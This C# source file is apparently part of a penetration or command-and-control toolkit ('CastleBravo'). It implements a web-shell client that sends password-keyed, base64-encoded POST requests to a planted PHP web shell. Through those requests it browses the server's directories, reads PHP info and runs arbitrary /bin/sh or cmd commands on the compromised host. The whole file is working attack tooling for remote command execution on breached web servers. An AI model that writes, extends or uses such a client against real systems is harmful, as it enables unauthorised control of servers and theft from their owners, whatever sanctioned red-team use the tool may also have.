using C2.Core;
using C2.Utils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Web;

namespace C2.Business.CastleBravo.WebShellTool
{
    public class WebShellClient
    {
        private readonly string url;
        private readonly string password;
        private readonly StringBuilder sb;
        private readonly WebClientEx clientEX;
        private readonly WebShellClientSetting clientSetting;
        public string PayloadLog { get => sb.ToString(); }
        public void Clear() { sb.Clear(); }
      

        public WebShellClient(string address, string password, string clientSetting)
        {
            this.url = address;
            this.password = password;
            this.clientSetting = WebShellClientSetting.LoadSetting(clientSetting);
            this.sb = new StringBuilder();

            this.clientEX = new WebClientEx
            {
                Timeout = 30000,//30秒超时
                Encoding = Encoding.Default
            };
            this.clientEX.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
        }

        public Tuple<string, string> CurrentCmdExcute()
        {
            List<string> paths = PHPIndex();
            return paths.IsEmpty() ? Tuple.Create(string.Empty, string.Empty) : Tuple.Create(paths[0], string.Empty);
        }

        public Tuple<string, string> CmdExcute(string excutePath, string command)
        {   
            bool isLinux = excutePath.StartsWith("/");
            string cmdPath = isLinux ? "/bin/sh" : "cmd";//需要先判断是什么系统
            string combineCommand = string.Format(isLinux ? "cd \"{0}\";{1};echo [S];pwd;echo [E]": "cd /d \"{0}\"&{1}&echo [S]&cd&echo [E]", excutePath, command);
            string result = PHPShell(cmdPath, combineCommand, command);

            string output;
            string newPath;
            string[] tmp = result.Split(new string[] { "[S]" }, StringSplitOptions.None);
            try
            {
                output = isLinux ? tmp[0].Replace("\n", "\r\n") : tmp[0];
                newPath = tmp[1].Split(new string[] { "[E]" }, StringSplitOptions.None)[0].Trim(new char[] { '\n', '\r' });
            }
            catch
            {
                return Tuple.Create(excutePath, string.Empty) ;
            }


            return Tuple.Create(newPath, output);

        }

        public Tuple<string, List<WSFile>, List<string>> CurrentPathBrowse()
        {
            return PathBrowse(PHPIndex());
        }

        public Tuple<string, List<WSFile>, List<string>> PathBrowse(List<string> pathList)
        {
            List<WSFile> pathFiles = new List<WSFile>();
            List<string> broPaths = new List<string>();

            if (pathList.Count == 0 || string.IsNullOrEmpty(pathList[0]))
                return Tuple.Create(string.Empty, pathFiles, broPaths);

            string path = pathList[0];

            //broPath仅针对window文件系统，内容为c: d: e:
            if (pathList.Count == 2 && pathList[1].Contains(":"))
                broPaths = pathList[1].Split(':').ToList();

            string readDict = PHPReadDict(path);
            foreach (string item in readDict.Split('\n'))
            {
                string[] itemInfo = item.Split('\t');
                if (itemInfo.Length < 4 || itemInfo[0].IsNullOrEmpty() || itemInfo[0] == "./" || itemInfo[0] == "../")
                    continue;

                pathFiles.Add(new WSFile(itemInfo[0].EndsWith("/") ? WebShellFileType.Directory : WebShellFileType.File,
                                         itemInfo[0].TrimEnd('/'),
                                         itemInfo[1],
                                         itemInfo[2],
                                         itemInfo[3]));
            }
            return Tuple.Create(path, pathFiles, broPaths);
        }
        public string PHPInfo()
        {
            sb.AppendLine("========获取php基础信息========");
            return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + clientSetting.ACTION + "=" + clientSetting.PHP_INFO);
        }

        private List<string> PHPIndex()
        {
            sb.AppendLine("========获取当前路径========");
            string[] result = PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + clientSetting.ACTION + "=" + clientSetting.PHP_INDEX).Split('\t');
            return result.Skip(0).Take(result.Length - 1).ToList();
        }

        private string PHPReadDict(string path)
        {
            sb.AppendLine("========获取" + path + "文件========");
            return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + clientSetting.ACTION + "=" + clientSetting.PHP_READDICT + "&" + clientSetting.PARAM1 + "=" + TransStringToBase64(path));
        }

        private string PHPShell(string cmdPath, string combineCommand, string oriCommand)
        {
            sb.AppendLine("========执行命令：" + oriCommand + "========");
            return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + 
                           clientSetting.ACTION + "=" + clientSetting.PHP_SHELL + "&" + 
                           clientSetting.PARAM1 + "=" + TransStringToBase64(cmdPath) + "&" +
                           clientSetting.PARAM2 + "=" + TransStringToBase64(combineCommand));
        }

        private string PHPPost(string payload)
        {   
            byte[] rspBytes  = new byte[0];
            string rspString = string.Empty;
            
            try
            {    
                using (GuarderUtil.WaitCursor)
                    rspBytes = clientEX.UploadData(url, "POST", Encoding.Default.GetBytes(payload));//得到返回字符流      

                rspString = Encoding.Default.GetString(rspBytes); //解码 
                foreach (string kv in payload.Split('&'))
                    sb.AppendLine(kv);
            }
            catch (Exception ex)
            {
                sb.AppendLine(ex.Message);
            }

            return MidStrEx(rspString, clientSetting.SPL, clientSetting.SPR);
        }

        private string MidStrEx(string sourse, string spl, string spr)
        {
            int splIndex = sourse.IndexOf(spl);
            if (splIndex == -1) return string.Empty;

            sourse = sourse.Substring(splIndex + spl.Length);

            int sprIndex = sourse.IndexOf(spr);
            if (sprIndex == -1) return string.Empty;

            return sourse.Remove(sprIndex);
        }

        private string TransStringToBase64(string str)
        {
            return HttpUtility.UrlEncode(Convert.ToBase64String(Encoding.UTF8.GetBytes(str)));
        }
    }

    public enum WebShellFileType
    {
        Null,
        Directory,
        File
    }

    public class WSFile
    {
        public WebShellFileType Type { get; set; }
        public string FileName { get; set; }
        public string CreateTime { get; set; }
        public string FileSize { get; set; }
        public string LastMod { get; set; }

        public WSFile(WebShellFileType type, string fileName, string createTime, string fileSize, string lastMod)
        {
            Type = type;
            FileName = fileName;
            CreateTime = createTime;
            FileSize = fileSize;
            LastMod = lastMod;
        }
    }


    public class WebClientEx : WebClient
    {
        public int Timeout { get; set; }

        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address);
            request.Timeout = Timeout;
            return request;
        }
    }
}

